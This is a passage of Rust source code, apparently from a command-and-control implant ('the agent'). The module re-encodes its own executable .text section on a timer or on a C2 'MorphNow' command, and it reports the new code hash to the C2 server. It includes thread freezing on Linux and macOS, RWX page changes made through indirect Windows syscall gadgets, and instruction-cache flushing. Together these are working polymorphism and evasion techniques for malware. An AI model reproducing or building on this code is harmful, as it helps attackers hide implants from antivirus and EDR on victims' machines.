        /// Helper: check whether a thread is in state 'T' (stopped).
        fn thread_is_stopped(tid: i32) -> std::io::Result<bool> {
            let status_path = format!("/proc/self/task/{tid}/status");
            let content = std::fs::read_to_string(&status_path)?;
            Ok(content.lines().any(|line| {
                if let Some(rest) = line.strip_prefix("State:") {
                    rest.trim_start().starts_with('T')
                } else {
                    false
                }
            }))
        }

        const VERIFY_RETRIES: u32 = 10;
        // Exponential backoff: 100 µs → 200 µs → 400 µs → … → ~51 ms total.
        const INITIAL_BACKOFF_US: u64 = 100;

        let mut unverified_tids: Vec<i32> = Vec::new();
        let mut backoff_us = INITIAL_BACKOFF_US;

        for attempt in 0..=VERIFY_RETRIES {
            unverified_tids.clear();
            for &tid in &tids {
                match thread_is_stopped(tid) {
                    Ok(true) => {} // confirmed stopped
                    Ok(false) => {
                        unverified_tids.push(tid);
                    }
                    Err(e) => {
                        tracing::debug!("self_reencode: cannot read status for tid={tid}: {e}");
                        unverified_tids.push(tid);
                    }
                }
            }

            if unverified_tids.is_empty() {
                break; // all threads confirmed stopped
            }

            if attempt < VERIFY_RETRIES {
                // Yield to give the kernel time to deliver pending SIGSTOPs.
                let ts = libc::timespec {
                    tv_sec: 0,
                    tv_nsec: (backoff_us * 1000) as i64,
                };
                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()) };
                backoff_us *= 2;
            }
        }

        if !unverified_tids.is_empty() {
            tracing::error!(
                "self_reencode: {} thread(s) failed suspension verification after {} retries: tids={:?} — aborting re-encoding pass",
                unverified_tids.len(),
                VERIFY_RETRIES,
                unverified_tids
            );
            // Resume all threads we stopped and return an error.
            while let Some(tid) = tids.pop() {
                let _ = unsafe {
                    libc::syscall(libc::SYS_tgkill, pid, tid, libc::SIGCONT as libc::c_long)
                };
            }
            anyhow::bail!(
                "self_reencode: {} thread(s) failed suspension verification — aborting to prevent .text corruption",
                unverified_tids.len()
            );
        }

        tracing::debug!(
            "self_reencode: all {} sibling threads confirmed stopped",
            tids.len()
        );
    }

    Ok(FrozenThreads {
        tids,
        pid,
        frozen_at: std::time::Instant::now(),
        thawed: false,
    })
}

#[cfg(target_os = "macos")]
type MachPort = u32;

#[cfg(target_os = "macos")]
type KernReturn = i32;

#[cfg(target_os = "macos")]
const KERN_SUCCESS: KernReturn = 0;

#[cfg(target_os = "macos")]
const TH_STATE_STOPPED: i32 = 1;

#[cfg(target_os = "macos")]
const THREAD_BASIC_INFO: i32 = 3;

#[cfg(target_os = "macos")]
#[repr(C)]
struct ThreadBasicInfo {
    user_time: u64,   // time_value_t (2 × i32)
    system_time: u64, // time_value_t (2 × i32)
    cpu_usage: i32,
    policy: i32,
    run_state: i32,
    flags: i32,
    suspend_count: i32,
    sleep_time: i32,
}

#[cfg(target_os = "macos")]
unsafe extern "C" {
    fn mach_task_self() -> MachPort;
    fn mach_thread_self() -> MachPort;
    fn task_threads(
        target_task: MachPort,
        act_list: *mut *mut MachPort,
        act_list_cnt: *mut u32,
    ) -> KernReturn;
    fn thread_suspend(target_act: MachPort) -> KernReturn;
    fn thread_resume(target_act: MachPort) -> KernReturn;
    fn mach_port_deallocate(task: MachPort, name: MachPort) -> KernReturn;
    fn vm_deallocate(target_task: MachPort, address: usize, size: usize) -> KernReturn;
    fn thread_info(
        target_act: MachPort,
        flavor: i32,
        thread_info_out: *mut i32,
        thread_info_out_cnt: *mut u32,
    ) -> KernReturn;
}

#[cfg(target_os = "macos")]
pub(crate) struct FrozenThreads {
    threads: Vec<MachPort>,
    task: MachPort,
    frozen_at: std::time::Instant,
    thawed: bool,
}

#[cfg(target_os = "macos")]
impl FrozenThreads {
    pub(crate) fn thaw(&mut self) {
        if self.thawed {
            return;
        }
        self.thawed = true;

        let elapsed = self.frozen_at.elapsed();
        if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
            tracing::warn!(
                "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
                elapsed.as_secs_f64()
            );
        }

        while let Some(thread) = self.threads.pop() {
            let _ = unsafe { thread_resume(thread) };
            let _ = unsafe { mach_port_deallocate(self.task, thread) };
        }
        tracing::debug!("self_reencode: all sibling threads resumed (macOS)");
    }
}

#[cfg(target_os = "macos")]
impl Drop for FrozenThreads {
    fn drop(&mut self) {
        if !self.thawed {
            tracing::warn!(
                "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
            );
            self.thaw();
        }
    }
}

#[cfg(target_os = "macos")]
pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
    unsafe {
        let task = mach_task_self();
        let self_thread = mach_thread_self();

        let mut thread_list: *mut MachPort = std::ptr::null_mut();
        let mut thread_count: u32 = 0;
        let kr = task_threads(
            task,
            &mut thread_list as *mut *mut MachPort,
            &mut thread_count as *mut u32,
        );
        if kr != KERN_SUCCESS {
            let _ = mach_port_deallocate(task, self_thread);
            anyhow::bail!("self_reencode: task_threads failed with kern_return_t {kr}");
        }

        let mut frozen = Vec::with_capacity(thread_count as usize);
        for idx in 0..thread_count as usize {
            let thread = *thread_list.add(idx);
            if thread == self_thread {
                continue;
            }

            let suspend_kr = thread_suspend(thread);
            if suspend_kr == KERN_SUCCESS {
                frozen.push(thread);
            } else {
                let _ = mach_port_deallocate(task, thread);
                tracing::debug!(
                    "self_reencode: thread_suspend failed for thread {} with kern_return_t {}",
                    thread,
                    suspend_kr
                );
            }
        }

        if !thread_list.is_null() {
            let list_size = (thread_count as usize) * std::mem::size_of::<MachPort>();
            let _ = vm_deallocate(task, thread_list as usize, list_size);
        }
        let _ = mach_port_deallocate(task, self_thread);

        tracing::info!(
            "self_reencode: froze {} sibling threads (macOS)",
            frozen.len()
        );

        // ── Verify thread suspension (CRIT-002) ──────────────────────────
        //
        // After calling thread_suspend() on each sibling, verify each thread
        // is actually in the stopped state by calling thread_info() with
        // THREAD_BASIC_INFO flavor and checking run_state == TH_STATE_STOPPED.
        //
        // If any thread is not stopped, we abort the re-encoding pass to
        // avoid rewriting .text under a still-running sibling.
        {
            let mut unverified_count = 0u32;
            for &thread in &frozen {
                let mut info: ThreadBasicInfo = unsafe { std::mem::zeroed() };
                let mut info_count = std::mem::size_of::<ThreadBasicInfo>() as u32 / 4; // counted in i32s
                let kr = unsafe {
                    thread_info(
                        thread,
                        THREAD_BASIC_INFO,
                        &mut info as *mut ThreadBasicInfo as *mut i32,
                        &mut info_count,
                    )
                };
                if kr != KERN_SUCCESS {
                    unverified_count += 1;
                    tracing::error!(
                        "self_reencode: thread_info failed for thread {} (kr={kr}) — verification failed",
                        thread
                    );
                } else if info.run_state != TH_STATE_STOPPED {
                    unverified_count += 1;
                    tracing::error!(
                        "self_reencode: thread {} is NOT stopped (run_state={}) — verification failed",
                        thread,
                        info.run_state
                    );
                }
            }

            if unverified_count > 0 {
                tracing::error!(
                    "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting re-encoding pass"
                );
                // Resume all threads we suspended and return an error.
                while let Some(thread) = frozen.pop() {
                    let _ = thread_resume(thread);
                    let _ = mach_port_deallocate(task, thread);
                }
                anyhow::bail!(
                    "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting to prevent .text corruption"
                );
            }
        }

        Ok(FrozenThreads {
            threads: frozen,
            task,
            frozen_at: std::time::Instant::now(),
            thawed: false,
        })
    }
}

// ── Core re-encoding logic ────────────────────────────────────────────────

/// Apply the code_transform pipeline to the agent's .text section with the
/// given seed.
///
/// # Safety
///
/// This modifies executable memory in-place.  All sibling threads are
/// suspended via `NtSuspendThread` (Windows) or `SIGSTOP` (Linux) before
/// page protections are changed, and resumed after the I-cache flush.
pub unsafe fn reencode_text(seed: u64) -> Result<()> {
    let text = find_text_section().context("self_reencode: locate .text section")?;

    if text.size == 0 {
        anyhow::bail!("self_reencode: .text section is empty");
    }

    tracing::info!(
        "self_reencode: beginning re-encoding of .text ({:#x}, {} bytes, seed=0x{:016x})",
        text.base,
        text.size,
        seed
    );

    // 1. Snapshot the current .text bytes.
    let original = std::slice::from_raw_parts(text.base as *const u8, text.size).to_vec();

    // 2. Apply the transformation pipeline.
    let transformed = code_transform::transform(&original, seed);

    if transformed.is_empty() {
        tracing::error!(
            "self_reencode: transform returned empty output — skipping re-encode (would NOP-pad entire .text)"
        );
        return Err(anyhow::anyhow!("transform produced empty output"));
    }

    if transformed.len() > text.size {
        // The transform may produce larger output.  We cannot grow the
        // section in-place, so we would need to truncate.  However, we
        // must first verify that the bytes beyond the original size are
        // all single-byte NOP instructions (0x90) — any non-NOP byte
        // would mean real code is being silently discarded.
        let tail = &transformed[text.size..];
        let all_nops = tail.iter().all(|&b| b == 0x90);
        if !all_nops {
            tracing::error!(
                "self_reencode: transformed .text is {} bytes, original is {} bytes, \
                 and trailing bytes are not all NOPs — skipping re-encoding to avoid corruption",
                transformed.len(),
                text.size
            );
            return Ok(());
        }
        tracing::warn!(
            "self_reencode: transformed .text is {} bytes, original is {} bytes — truncating NOP-padding to fit",
            transformed.len(),
            text.size
        );
    }

    let write_len = transformed.len().min(text.size);

    // 3. Freeze sibling threads before touching page protections.
    let mut frozen = freeze_threads().context("self_reencode: freeze sibling threads")?;

    // 4. Make pages writable, write transformed code, restore protections.
    let old_prot =
        make_writable(text.base, text.size).context("self_reencode: make .text writable")?;

    // Write the transformed bytes.
    std::ptr::copy_nonoverlapping(transformed.as_ptr(), text.base as *mut u8, write_len);

    // NOP-pad remaining bytes if transformed is shorter.
    if write_len < text.size {
        std::ptr::write_bytes(
            (text.base + write_len) as *mut u8,
            0x90, // NOP
            text.size - write_len,
        );
    }

    // Restore original page protections.
    restore_protection(text.base, text.size, &old_prot)
        .context("self_reencode: restore .text protections")?;

    // 5. Flush the instruction cache.
    flush_icache(text.base, text.size);

    // 6. Resume sibling threads now that .text is back to RX and flushed.
    frozen.thaw();

    tracing::info!(
        "self_reencode: successfully re-encoded {} bytes of .text with seed 0x{:016x}",
        write_len,
        seed
    );

    Ok(())
}

// ── Platform-specific memory protection helpers ───────────────────────────

/// Snapshot of original page protection flags.
#[cfg(windows)]
struct ProtSnapshot(u32);

#[cfg(target_os = "linux")]
struct ProtSnapshot(u32);

#[cfg(target_os = "macos")]
struct ProtSnapshot(i32);

/// Make the memory region `[addr, addr+len)` read-write-executable.
/// Returns a snapshot of the original protection to restore later.
#[cfg(windows)]
unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
    let page_size = 4096; // Windows page size is always 4096
    let aligned = addr & !(page_size - 1);
    let aligned_end = ((addr + len) + page_size - 1) & !(page_size - 1);
    let aligned_len = aligned_end - aligned;

    let mut base_ptr = aligned as *mut libc::c_void;
    let mut region_size = aligned_len;
    let mut old_prot: u32 = 0;
    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory").map(|t| unsafe {
        crate::syscalls::do_syscall(
            t.ssn,
            t.gadget_addr,
            &[
                -1isize as u64,                    // current process handle
                &mut base_ptr as *mut _ as u64,    // base address (in/out)
                &mut region_size as *mut _ as u64, // region size (in/out)
                0x40u64,                           // PAGE_EXECUTE_READWRITE
                &mut old_prot as *mut _ as u64,
            ],
        )
    });

    // Non-negative NTSTATUS means success.
    match status {
        Ok(s) if s >= 0 => Ok(ProtSnapshot(old_prot)),
        Ok(s) => anyhow::bail!("NtProtectVirtualMemory(RWX) returned NTSTATUS {:#010x}", s),
        Err(e) => anyhow::bail!("NtProtectVirtualMemory(RWX) syscall failed: {}", e),
    }
}

#[cfg(windows)]
unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Result<()> {
    let page_size = 4096;
    let aligned = addr & !(page_size - 1);
    let aligned_end = ((addr + len) + page_size - 1) & !(page_size - 1);
    let aligned_len = aligned_end - aligned;

    let mut base_ptr = aligned as *mut libc::c_void;
    let mut region_size = aligned_len;
    let mut dummy: u32 = 0;
    let status = crate::syscalls::get_syscall_id("NtProtectVirtualMemory").map(|t| unsafe {
        crate::syscalls::do_syscall(
            t.ssn,
            t.gadget_addr,
            &[
                -1isize as u64,
                &mut base_ptr as *mut _ as u64,
                &mut region_size as *mut _ as u64,
                old.0 as u64,
                &mut dummy as *mut _ as u64,
            ],
        )
    });

    match status {
        Ok(s) if s >= 0 => Ok(()),
        Ok(s) => anyhow::bail!(
            "NtProtectVirtualMemory(restore) returned NTSTATUS {:#010x}",
            s
        ),
        Err(e) => anyhow::bail!("NtProtectVirtualMemory(restore) syscall failed: {}", e),
    }
}

#[cfg(windows)]
unsafe fn flush_icache(addr: usize, len: usize) {
    // NtFlushInstructionCache for current process.
    let _ = crate::syscalls::get_syscall_id("NtFlushInstructionCache").map(|t| {
        crate::syscalls::do_syscall(
            t.ssn,
            t.gadget_addr,
            &[-1isize as u64, addr as u64, len as u64],
        )
    });
}

// ── Linux memory protection helpers ───────────────────────────────────────

#[cfg(target_os = "linux")]
unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
    let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
    let aligned = addr & !(page_size - 1);
    let aligned_len = ((addr + len) - aligned + page_size - 1) & !(page_size - 1);

    // Snapshot the original protection from /proc/self/maps.
    let orig_prot = read_page_protection(aligned);

    if libc::mprotect(
        aligned as *mut libc::c_void,
        aligned_len,
        libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
    ) != 0
    {
        anyhow::bail!("mprotect(RWX) failed: {}", std::io::Error::last_os_error());
    }
    Ok(ProtSnapshot(orig_prot))
}

#[cfg(target_os = "linux")]
unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Result<()> {
    let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
    let aligned = addr & !(page_size - 1);
    let aligned_len = ((addr + len) - aligned + page_size - 1) & !(page_size - 1);

    if libc::mprotect(aligned as *mut libc::c_void, aligned_len, old.0 as i32) != 0 {
        anyhow::bail!(
            "mprotect(restore) failed: {}",
            std::io::Error::last_os_error()
        );
    }
    Ok(())
}

#[cfg(target_os = "linux")]
unsafe fn flush_icache(addr: usize, len: usize) {
    #[cfg(target_arch = "aarch64")]
    {
        // aarch64 I-cache is NOT coherent with D-cache.
        const CACHE_LINE: usize = 64;
        let end = addr + len;
        let mut p = addr & !(CACHE_LINE - 1);
        while p < end {
            std::arch::asm!("dc cvau, {x}", x = in(reg) p);
            p += CACHE_LINE;
        }
        std::arch::asm!("dsb ish");
        let mut p = addr & !(CACHE_LINE - 1);
        while p < end {
            std::arch::asm!("ic ivau, {x}", x = in(reg) p);
            p += CACHE_LINE;
        }
        std::arch::asm!("dsb ish", "isb");
    }
    #[cfg(not(target_arch = "aarch64"))]
    {
        // x86_64: I-cache is coherent; mprotect serialises.  No-op.
        let _ = (addr, len);
    }
}

// ── macOS memory protection helpers ───────────────────────────────────────

#[cfg(target_os = "macos")]
unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
    let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
    let aligned = addr & !(page_size - 1);
    let aligned_len = ((addr + len) - aligned + page_size - 1) & !(page_size - 1);

    // Mach-O __TEXT is typically RX; preserve that default on restore.
    let original = libc::PROT_READ | libc::PROT_EXEC;
    if libc::mprotect(
        aligned as *mut libc::c_void,
        aligned_len,
        libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
    ) != 0
    {
        anyhow::bail!(
            "mprotect(RWX) failed on macOS: {}",
            std::io::Error::last_os_error()
        );
    }

    Ok(ProtSnapshot(original))
}

#[cfg(target_os = "macos")]
unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Result<()> {
    let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
    let aligned = addr & !(page_size - 1);
    let aligned_len = ((addr + len) - aligned + page_size - 1) & !(page_size - 1);

    if libc::mprotect(aligned as *mut libc::c_void, aligned_len, old.0) != 0 {
        anyhow::bail!(
            "mprotect(restore) failed on macOS: {}",
            std::io::Error::last_os_error()
        );
    }
    Ok(())
}

#[cfg(target_os = "macos")]
unsafe fn flush_icache(addr: usize, len: usize) {
    #[cfg(target_arch = "aarch64")]
    {
        unsafe extern "C" {
            fn sys_icache_invalidate(start: *mut libc::c_void, len: usize);
        }
        sys_icache_invalidate(addr as *mut libc::c_void, len);
    }
    #[cfg(not(target_arch = "aarch64"))]
    {
        // x86_64 has coherent I-cache for self-modifying code once mprotect returns.
        let _ = (addr, len);
    }
}

#[cfg(target_os = "linux")]
fn read_page_protection(addr: usize) -> u32 {
    if let Ok(maps) = std::fs::read_to_string("/proc/self/maps") {
        for line in maps.lines() {
            let parts: Vec<&str> = line.splitn(6, ' ').collect();
            if parts.len() >= 2 {
                let range: Vec<&str> = parts[0].splitn(2, '-').collect();
                if range.len() == 2 {
                    if let (Ok(start), Ok(end)) = (
                        usize::from_str_radix(range[0], 16),
                        usize::from_str_radix(range[1], 16),
                    ) {
                        if addr >= start && addr < end {
                            let mut prot: u32 = 0;
                            for c in parts[1].chars() {
                                match c {
                                    'r' => prot |= libc::PROT_READ as u32,
                                    'w' => prot |= libc::PROT_WRITE as u32,
                                    'x' => prot |= libc::PROT_EXEC as u32,
                                    _ => {}
                                }
                            }
                            return prot;
                        }
                    }
                }
            }
        }
    }
    (libc::PROT_READ | libc::PROT_EXEC) as u32
}

// ── Periodic re-encoding task ─────────────────────────────────────────────

/// Spawn the background re-encoding task.  This should be called once after
/// the first C2 check-in completes.
///
/// The task sleeps for the configured interval, then re-encodes .text with a
/// fresh seed derived from the current timestamp and the C2-provided nonce.
pub fn spawn_periodic_reencode(
    seed: u64,
    interval: Duration,
    shutdown: std::sync::Arc<tokio::sync::Notify>,
) -> tokio::task::JoinHandle<()> {
    // Store the initial seed.
    set_seed(seed);
    REENCODE_INTERVAL_SECS.store(interval.as_secs(), Ordering::SeqCst);

    tokio::spawn(async move {
        loop {
            let secs = REENCODE_INTERVAL_SECS.load(Ordering::SeqCst);
            let sleep_dur = Duration::from_secs(secs.max(300)); // minimum 5 minutes

            tokio::select! {
                _ = crate::memory_guard::guarded_sleep(sleep_dur, None, 0) => {},
                _ = shutdown.notified() => {
                    tracing::info!("self_reencode: shutdown signal received, stopping periodic re-encode");
                    return;
                }
            }

            let current = current_seed();
            let fresh_seed = derive_fresh_seed(current);
            tracing::info!(
                "self_reencode: periodic re-encode triggered with seed 0x{fresh_seed:016x}"
            );

            match unsafe { reencode_text(fresh_seed) } {
                Ok(()) => {
                    set_seed(fresh_seed);
                }
                Err(e) => {
                    tracing::error!("self_reencode: periodic re-encode failed: {e:#}");
                }
            }
        }
    })
}

/// Perform a one-shot re-encoding with the given seed.
/// Used for the initial re-encode after C2 check-in.
pub fn reencode_once(seed: u64) -> Result<()> {
    let fresh_seed = derive_fresh_seed(seed);
    tracing::info!("self_reencode: initial re-encode with seed 0x{fresh_seed:016x}");
    unsafe { reencode_text(fresh_seed) }?;
    set_seed(fresh_seed);
    Ok(())
}

/// Compute the SHA-256 hash of the agent's current `.text` section.
///
/// Returns the hex-encoded digest string.  Used to verify that morphing
/// produced a unique layout and to report the hash to the C2 server for
/// operational tracking.
pub fn hash_text_section() -> Result<String> {
    let text = find_text_section().context("self_reencode: locate .text section for hashing")?;
    let slice = unsafe { std::slice::from_raw_parts(text.base as *const u8, text.size) };
    let digest = Sha256::digest(slice);
    Ok(hex::encode(digest))
}

/// Immediate synchronous morph triggered by `Command::MorphNow`.
///
/// This function:
/// 1. Stores the supplied seed.
/// 2. Re-encodes the `.text` section with a fresh derived seed.
/// 3. Hashes the resulting `.text` section.
/// 4. Returns the hex-encoded SHA-256 hash.
///
/// The caller should send the hash back to the server (via `MorphResult`
/// message or as the `TaskResponse` result).
pub fn morph_now(seed: u64) -> Result<String> {
    let fresh_seed = derive_fresh_seed(seed);
    tracing::info!("self_reencode: MorphNow triggered with seed 0x{fresh_seed:016x}");
    unsafe { reencode_text(fresh_seed) }?;
    set_seed(fresh_seed);
    let hash = hash_text_section()?;
    tracing::info!("self_reencode: MorphNow completed, .text hash = {hash}");
    Ok(hash)
}
